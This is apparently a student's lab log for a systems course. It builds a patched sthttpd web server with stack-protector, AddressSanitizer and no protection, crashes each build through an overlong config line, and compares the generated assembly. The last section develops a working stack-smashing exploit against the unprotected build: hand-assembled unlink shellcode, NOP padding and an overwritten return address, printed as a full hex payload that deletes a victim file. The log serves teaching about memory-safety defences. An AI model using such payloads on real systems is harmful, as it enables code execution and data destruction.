smashinglab.txt lab log

I begin by copying and pasting the patch in the spec into a new file,
sthttpd.patch.
Then I get and unzip the tar file to which the patch applies:
     $ http://web.cs.ucla.edu/classes/winter20/cs33/lab/sthttpd-2.27.0.tar.gz
     $ tar -xvf sthttpd-2.27.0.tar.gz
patching file sthttpd-2.27.0/src/thttpd.c
patching file sthttpd-2.27.0/src/libhttpd.c
patch unexpectedly ends in middle of line
Hunk #1 succeeded at 4078 with fuzz 2.

Then I check my gcc version to make sure that it is the correct one:
     $ which gcc
/usr/local/cs/bin/gcc
which shows me that I am using the correct version.

Now I build it with the patch applied using the the command given in the spec:
    $ ./configure \LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
It configures successfully. Now I compile it three times with different
compiler options:
(SP) for strong stack protection:
     $ make clean
     $ make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
     $ mv src/thttpd src/thttpd-sp
(AS) for address sanitization:
     $ make clean
     $ make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address -static-libasan'
     $ mv src/thttpd src/thttpd-as
(NO) for neither:
     $ make clean
     $ make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
     $ mv src/thttpd src/thttpd-no
These commands succesfully build the three different versions of the program.

Now I run each of the modified sthttpd daemons under GDB on the correct port. First I
calculate the correct port number for each of the versions:

204915304 % 293	== 187
12330 + 3 * (X % 293) + Y
12330 + 3 * (187) + Y
12330 +	561 + Y
12891 +	Y
1=SP, 2=AS, 3=NO
SP : 12892
AS : 12893
NO : 12894

Now I check that the three executables run. I use the following commands to create
the servers. (each in a separate window):
    $ src/thttpd-sp -p 12892 -D
    $ src/thttpd-as -p 12893 -D
    $ src/thttpd-no -p 12894 -D
I log onto seasnet in new windows and test that the files work. I create a file
foo.txt and write the following message:
	Testing that web servers work in normal case.
Then I test the servers:
     $ curl http://localhost:12892/foo.txt
     $ curl http://localhost:12893/foo.txt
     $ curl http://localhost:12894/foo.txt

Each of these tests outputs the message in foo.txt:
     Testing that web servers work in normal case.
Therefore the servers are working under the normal case.

Now we want to try to make the servers crash. First with variant SP, I try to pass
a file that is too large. To do this, I copy and paste my previous message over and
over. I copy and paste the previous message 50 times. 
This is not large enough and it prints the message:
     "Testing tha web servers work in normal case."
50 times.

I check the patch file again and it says that it changed the char line[10000] to
char line[100]. I might have been crating new lines previously so now I make foo.txt
one continuous string of characters that is greater than 100 lines. 
I test it in gdb:


Too make variant sp crash, I try passing in a file that is too large. In foo.txt I
write over 300 'a' characters:
port=aaaaaaaaaaaa....
  $ gdb src/thttpd-sp
  (gdb) r -p 12892 -D -C foo.txt
This outputs:

ttpd-2.27.0/src/thttpd-sp terminated
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff6da40b8 in ?? () from /lib64/libgcc_s.so.1

Now I backtrace so I can see what exactly caused the program to crash:
    (gdb) backtrace

#0  0x00007ffff6da40b8 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff6da4fb9 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00007ffff76e2a96 in backtrace () from /lib64/libc.so.6
#3  0x00007ffff7646ee4 in __libc_message () from /lib64/libc.so.6
#4  0x00007ffff76e6567 in __fortify_fail () from /lib64/libc.so.6
#5  0x00007ffff76e6522 in __stack_chk_fail () from /lib64/libc.so.6
#6  0x0000000000404155 in read_config (filename=<optimized out>) at thttpd.c:1129
#7  0x6161616161616161 in ?? ()
#8  0x6161616161616161 in ?? ()
#9  0x6161616161616161 in ?? ()

    (gdb) disassemble 0x40413c, 0x404158

0x000000000040413c <read_config+1388>:	mov    %r14,%rdi
   0x000000000040413f <read_config+1391>:	callq  0x403b80 <e_strdup>
   0x0000000000404144 <read_config+1396>:	mov    %rax,0x212e3d(%rip)        # 0x616f88 <hostname>
   0x000000000040414b <read_config+1403>:	jmpq   0x403f25 <read_config+853>
   0x0000000000404150 <read_config+1408>:	callq  0x402410 <__stack_chk_fail@plt>
   0x0000000000404155 <read_config+1413>:	nopl   (%rax)

I need a closer look to see the problem so I rerun the program in gdb and set a break
at read_config
   (gdb) break read_config
   (gdb) set disassemble-next-line on
I step through the program until I get to:

*** stack smashing detected ***: /w/home.20/class/classwba/Documents/33/smashinglab/sthttpd-2.27.0/src/thttpd-sp terminated

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff6da40b8 in ?? () from /lib64/libgcc_s.so.1
=> 0x00007ffff6da40b8:	80 39 48	cmpb   $0x48,(%rcx)

I look above to figure out what may have caused the crash and find the following lines:

0x000000000040403d <read_config+1133>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
   0x0000000000404042 <read_config+1138>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
   0x000000000040404b <read_config+1147>:	0f 85 ff 00 00 00	jne    0x404150 <read_config+1408>

This program crashed because it used a canary, and when I input a file that was too
large it was overwritten. Then when the program compared to make sure no overflow had
happened it found that there was overflow and crashed the program for safety.


After making variant sp crash, we now want to do the same for variant AS:

   $ gdb src/thttpd-as
   (gdb) r -p 12893 -D -C foo.txt

==3126==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcc24 at pc 0x00000043760b bp 0x7fffffffcb70 sp 0x7fffffffc320
WRITE of size 343 at 0x7fffffffcc24 thread T0

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff70730b8 in ?? () from /lib64/libgcc_s.so.1

    (gdb) backtrace


#0  0x00007ffff70730b8 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff7073fb9 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x0000000000513c50 in __sanitizer::BufferedStackTrace::SlowUnwindStack (
    this=0x7fffffffadf0, pc=4421131, max_depth=<optimized out>)
    at ../../../../gcc-9.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:125
#3  0x00000000004177b7 in __asan::GetStackTrace (fast=false, context=0x0, bp=140737488341872, 
    pc=4421131, max_depth=256, stack=0x7fffffffadf0)
    at ../../../../gcc-9.2.0/libsanitizer/asan/asan_stack.h:45
#4  __asan::ErrorGeneric::Print (
    this=this@entry=0x7b3888 <__asan::ScopedInErrorReport::current_error_+8>)
    at ../../../../gcc-9.2.0/libsanitizer/asan/asan_errors.cc:571
#5  0x00000000004f618d in __asan::ErrorDescription::Print (
    this=0x7b3880 <__asan::ScopedInErrorReport::current_error_>)
    at ../../../../gcc-9.2.0/libsanitizer/asan/asan_errors.h:420
#6  __asan::ScopedInErrorReport::~ScopedInErrorReport (this=0x7fffffffb6a6, 
    __in_chrg=<optimized out>) at ../../../../gcc-9.2.0/libsanitizer/asan/asan_report.cc:140
#7  0x00000000004f5b50 in __asan::ReportGenericError (pc=4421131, bp=bp@entry=140737488341872, 
    sp=sp@entry=140737488339744, addr=addr@entry=140737488342052, is_write=is_write@entry=true, 
    access_size=access_size@entry=343, exp=0, fatal=false)
    at ../../../../gcc-9.2.0/libsanitizer/asan/asan_report.cc:192
#8  0x000000000043762d in __interceptor_fgets (s=<optimized out>, size=<optimized out>, 
    file=<optimized out>)
    at ../../../../gcc-9.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1200
--Type <RET> for more, q to quit, c to continue without paging--
#9  0x000000000052b46f in read_config (filename=<optimized out>) at thttpd.c:1015
#10 0x6161616161616161 in ?? ()
#11 0x6161616161616161 in ?? ()
#12 0x6161616161616161 in ?? ()

Again the problem is in read_config, so we re-run the prgram and set a break as we
did previously
    $ gdb src/thttpd-as
    (gdb) break read_config
    (gdb) r -p 12893 -D -C foo.txt
    (gdb) set disassemble-next-line on

Stepping through we get:

0x000000000052b433 <read_config+115>:	c7 80 14 80 ff 7f f3 f3 f3 f3	movl   $0xf3f3f3f3,0x7fff8014(%rax)
   0x000000000052b43d <read_config+125>:	e8 ae 40 f3 ff	callq  0x45f4f0 <__interceptor_fopen(char const*, char const*)>
   0x000000000052b442 <read_config+130>:	48 89 04 24	mov    %rax,(%rsp)
(gdb) n
1009	    if ( fp == (FILE*) 0 )
=> 0x000000000052b446 <read_config+134>:	48 85 c0	test   %rax,%rax
   0x000000000052b449 <read_config+137>:	0f 84 db 07 00 00	je     0x52bc2a <read_config+2154>

The program calls the function__interceptor_fopen and then runs a test command based
on that program. Then, based on the test it either continues running or jumps to instrutions
that will crash the program. 

Now we do the same for variant NO:

    $ gdb src/thttpd-no
    (gdb) r -p 12894 -D -C foo.txt

Using host libthread_db library "/lib64/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x0000000000403f69 in read_config (filename=<optimized out>) at thttpd.c:1189
1189	    (void) fclose( fp );

I follow the same process as for the other variants:
    (gdb) backtrace

#0  0x0000000000403f69 in read_config (filename=<optimized out>) at thttpd.c:1189
#1  0x6161616161616161 in ?? ()
#2  0x6161616161616161 in ?? ()
....

The problem is in read_config again.
    $ gdb src/thttpd-no
    (gdb) break read_config
    (gdb) r -p 12894 -D -C foo.txt
    (gdb) set disassemble-next-line on
Now I step through.
Once the program reaches the Segmentation fault I look at the previous lines:

   0x0000000000403f55 <read_config+1109>:       4c 89 ef        mov    %r13,%rdi
   0x0000000000403f58 <read_config+1112>:       e8 d3 e3 ff ff  callq  0x402330 <fclose@plt>
   0x0000000000403f5d <read_config+1117>:       48 83 c4 70     add    $0x70,%rsp
   0x0000000000403f61 <read_config+1121>:       5b      pop    %rbx
   0x0000000000403f62 <read_config+1122>:       5d      pop    %rbp
   0x0000000000403f63 <read_config+1123>:       41 5c   pop    %r12
   0x0000000000403f65 <read_config+1125>:       41 5d   pop    %r13
   0x0000000000403f67 <read_config+1127>:       41 5e   pop    %r14
=> 0x0000000000403f69 <read_config+1129>:       c3      retq

There is no obvious reason for the program to have failed in this case. Different from
the other two programs, this variant was compiled using -zexecstack meaning that the
program does not check buffer overflow. There is no function to do so in this variant.
Therefore all of the code runs, and when the program tries to return, the address has
been overwritten. The program tries to return anyway to the overwritten address, but
the address does not exist and a segmentation fault occurs. 


Now I generate the assembly code for thttpd.c three times, one for each variant. I start by
configuring again:
    $ ./configure \LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
    $ make clean
First version:
    $ make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
    $ mv thttpd.o thttpd-sp.s
It worked, second version:
    $ make clean
    $ make CFLAGS='-S -O2 -fno-inline -fsanitize=address -static-libasan'
    $ mv thttpd.o thttpd-as.s
Third version:
    $ make clean
    $ make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
    $ mv thttpd.0 thttpd-no.s

Now compare the three assembly-language files' implementations of the handle_read
function. I start by opening each version in a separate window so I can easily
view and compare the differences.

SP vs NO:
Both SP and NO's handle_read function have the same length, and there are
actually no differences between the two handle_read functions.

SP vs AS:
First, AS is much longer than SP. There are so many differences that I try to look for general
trends as opposed to specific things to compare.
In AS, the -fsanitize=address tag uses shadow bytes that keep track of whether the stack has been
pollutted or not. This results in many commands like this:

4580        cmpb    $0, 2147450880(%rax)
4581        jne     .L1193
Where the result of cmpb instruction causes (or not) a conditional jump which will crash the program
depending on whether the stack has been pollutted.
jne goes to here:

.L1193:
 5036        call    __asan_report_load8
and __asan_report_load8 will crash the program. 

NO vs AS:
Because SP and NO are identical, the differences between SP/AS and NO/AS will be exactly
the same.

9. BUILDING AN EXPLOIT
Finally, I want to build an exploit for the bug in NO that relies on the attacker tricking the victim
into invoking thttpd with a particular value for the -C option. I start by creating the victim file
within /sthttpd-2.27.0/src:
       $ emacs victim.txt
And I type "to be deleted" in the file.
I know that the array of characters has length 100, so after character 100 overflow will begin. I
therefore need to find the addresses at the end of the array, as well as the address of the stack
return address. I should be able to find the return address by stepping through the program and
looking at the value of %rsp, the stack pointer register. 

    $ gdb src/thttpd-no
    (gdb) break read_config
    (gdb) r -p 12894 -D -C foo.txt
I updated the file foo.txt so that it would not crash the program while we step through.
    (gdb) layout next
I use this to open the gdb visualizer so I can see all the register values while I step through the assembly.
I look at the visualizer to see the value of %rsp:
rsp            0x7fffffffce68	   0x7fffffffce68
I then get the current line address so I can see the total size:
    (gdb) print &line
$1 = (char (*)[100]) 0x7fffffffcdd0
If I subtract one from the other I can get the difference between the address of char line[100] and the
the return address.
0x7fffffffce68 - 0x7fffffffcdd0 = 0x98 = 152 bytes in decimal.
Therefore, if I put 152 bytes between the beginning of the array and the command that we want to overwrite
with, it should be in the correct position.
In order to find the correct file to delete (victim.txt) I use the following command:
echo -n "victim.txt" | od -A n -t x1

76 69 63 74 69 6d 2e 74 78 74
We need to add a null byte at the end so it will be:
7669 6374 696d 2e74 7874 00
We can see by looking at the hex that victim.txt takes up 10 bytes in memory.

For alignment the hex for "victim.txt" should go 16 bytes before the return address.
0x7fffffffce68 - 0x10 = 0x7FFFFFFFCE58.	

Now I want to find the byte sequence for the remove function. Online I find a
simple c program that calls remove().

#include<stdio.h> 
int main() 
{ 
   if (remove("abc.txt") == 0) 
      printf("Deleted successfully"); 
   else
      printf("Unable to delete the file"); 
  
   return 0; 
}

I add it into a file "getremove.c"
I change the value to remove a valid file which I create called "rmthis.txt".
    $ gcc -O2 getremove.c
    $ gdb a.out
    (gdb) break remove
    (gdb) set disassemble-next-line on
    (gdb) r
    (gdb) layout next

I copy each line printed out by disassemble each time I step, which give me:

0x00007ffff7a78da0 <remove+0>:	53	push   %rbx
0x00007ffff7a78da1 <remove+1>:	48 89 fb        mov    %rdi,%rbx
0x00007ffff7a78da4 <remove+4>:	e8 87 53 08 00  callq  0x7ffff7afe130 <unlink>
0x00007ffff7afe130 <unlink+0>:	b8 57 00 00 00  mov    $0x57,%eax
0x00007ffff7afe135 <unlink+5>:	0f 05   syscall
0x00007ffff7afe137 <unlink+7>:	48 3d 01 f0 ff ff	cmp    $0xfffffffffffff001,%rax
0x00007ffff7afe13d <unlink+13>:	73 01   jae    0x7ffff7afe140 <unlink+16>
0x00007ffff7afe13f <unlink+15>:	c3	retq
0x00007ffff7a78da9 <remove+9>:	85 c0   test   %eax,%eax
0x00007ffff7a78dab <remove+11>:	74 24   je     0x7ffff7a78dd1 <remove+49>
0x00007ffff7a78dd1 <remove+49>:	5b	pop    %rbx
0x00007ffff7a78dd2 <remove+50>:	c3	retq

Now we have the bytes for the unlink function, which is the piece that
I need. Now I have several of the commands that I need so I create a file
"ascommands.s" and input the following:

mov $0x7FFFFFFFCE58, %rdi
mov $0x57, %rax
syscall

I need to get the machine code for these instructions so I use objdump to do so:
  $ gcc -c ascommands.s
  $ objdump -d ascommands.o
Which prints out:
0000000000000000 <.text>:
   0:	48 bf 58 ce ff ff ff 	movabs $0x7fffffffce58,%rdi
   7:	7f 00 00 
   a:	48 c7 c0 57 00 00 00 	mov    $0x57,%rax
  11:	0f 05                	syscall
  
This gives me the first bit of machine code that I can put into my exploit file.
Before I add this, I need to get the hex for "port=". I use the same command as before:
    $ echo -n "port=" | od -A n -t x1
70 6f 72 74 3d 00 00 00
I add three trailing 00's for alignment.
Now I add this into my exploit file foo.txt:

70 6f 72 74 3d 00 00 00 // port=
48 bf 38 ce ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05 // unlink
00's ......
76 69 63 74 69 6d 2e 74 78 74 00 00 00 00 00 00 // victim.txt
d8 cd ff ff ff 7f 00 00 // 0x7fffffffcdd0 + 0x8 = 7FFFFFFFCDD8

Above we have 43 bits, so we need to add 152 - 43 == 109 "90" bits.
I use 90 because it is the no op instruction in assembly.

This creates:
0000000: 70 6f 72 74 3d 00 00 00 48 bf 58 ce ff ff ff 7f
0000010: 00 00 48 c7 c0 57 00 00 00 0f 05 90 90 90 90 90
0000020: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
0000030: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
0000040: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
0000050: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
0000060: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
0000070: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
0000080: 90 90 90 90 90 90 90 90 76 69 63 74 69 6d 2e 74
0000090: 78 74 00 00 00 00 00 00 d8 cd ff ff ff 7f 00 00

I put this into a file test.txt.
    $ xxd -r test.txt src/please.txt
    $ cd src
    $ gdb thttpd-no
    (gdb) r -p 12894 -D -C please.txt

Starting program: /w/home.20/class/classwba/Documents/33/smashinglab/sthttpd-2.27.0/src/thttpd-no -p 12894 -D -C please.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffce5a in ?? ()

    (gdb) quit
Now I check for the file victim.txt.
    $ ls
    $ ls *vic*
It does not exist.
This means that the exploit worked! 
